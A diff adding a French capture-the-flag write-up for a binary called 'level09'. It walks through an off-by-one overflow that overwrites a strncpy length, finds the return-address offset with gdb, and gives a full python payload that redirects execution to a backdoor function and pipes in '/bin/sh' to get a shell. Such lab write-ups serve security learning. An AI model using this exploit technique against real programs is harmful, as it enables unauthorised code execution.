@@ -1,0 +1,21 @@
+Le buff stock plusieurs choses :
+ - Le message sur une longueur de 140
+ - Le username juste a la suite
+ - Un int a l'index 180 qui est utilise comme size pour le strncpy.
+On peut en deduire que username doit avoir une longueur de 180 - 140 = 40.
+Or lorsque le username est stocke dans buff il est utilise <= 40 avec un i qui commence a 0.
+Grave erreur car on peut copier 41 characteres au lieu de 40 est donc ecrire sur la variable qui suit en l'occurence la size utilise par strncpy.
+Comme on est malin on va faire en sorte de pouvoir ecrire un maximum sur la stack grace a ce strncpy et essayer d'atteindre le rip (eip).
+On va donc ecrire 0xff a cet emplacement ce qui va nous permettre d'ecrire jusqu'a 255 characteres.
+Calculons l'offset de rip par rapport a buff.
+b *handle_msg+112
+run
+x $rsp
+Dans set_msg le debut du buff commence a 0x7fffffffe500
+info frame
+L'adresse de retour de handle_msg est a 0x7fffffffe5c8. On a dit que l'on pouvait ecrire jusqu'a 255 a partir du debut du buffer.
+0x7fffffffe5c8 - 0x7fffffffe500 = 200 On obtient un buffer de 200, on va pouvoir l'ecraser.
+Une fonction secret_backdoor existe dans le programme on va donc l'utiliser. Elle attend la commande a executer dans system sur STDIN.
+On peut donc envoyer ceci au programme :
+python -c 'print "A"*40 + "\xff" + "\n" + "B"*200 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1] + "\n" + "/bin/sh"' > /tmp/ff && cat /tmp/ff - | ./level09
+Et c'est gagne !
